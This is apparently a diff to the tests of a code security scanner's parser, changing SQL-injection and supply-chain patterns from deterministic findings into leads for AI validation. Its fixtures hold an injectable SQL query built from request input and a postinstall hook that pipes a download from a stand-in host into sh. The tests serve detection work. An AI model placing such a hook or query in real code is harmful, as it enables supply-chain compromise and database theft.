@@ -21,23 +21,24 @@ const output = (lines) => [
   'CODEVET_DISCOVERY_END',
 ].join('\n')
 
-test('detects likely SQL injection deterministically', () => {
+test('keeps context-dependent security patterns as leads', () => {
   const code = 'db.query(`SELECT * FROM users WHERE id = ${req.query.id}`)'
   const result = parseScannerOutput(output([
     candidate('security_signal', 'src/input.ts', 10, code),
     context('src/input.ts', 10, code),
   ]))
-  assert.ok(result.securityFindings.some((finding) => finding.ruleId === 'likely-sql-injection'))
+  assert.equal(result.securityFindings.length, 0)
+  assert.ok(result.candidates.some((lead) => lead.category === 'security_signal'))
 })
 
-test('detects high-risk supply-chain behavior deterministically', () => {
+test('keeps suspicious supply-chain patterns as leads for AI validation', () => {
   const code = '"postinstall": "curl https://bad.invalid/p | sh"'
   const result = parseScannerOutput(output([
     candidate('supply_chain', 'package.json', 8, code),
     context('package.json', 8, code),
   ]))
-  assert.ok(result.securityFindings.some((finding) => finding.ruleId === 'malicious-install-hook'))
-  assert.ok(result.securityFindings.some((finding) => finding.ruleId === 'download-and-execute'))
+  assert.equal(result.securityFindings.length, 0)
+  assert.ok(result.candidates.some((lead) => lead.category === 'supply_chain'))
 })
 
 test('correlates sensitive sources and network sinks across direct imports', () => {
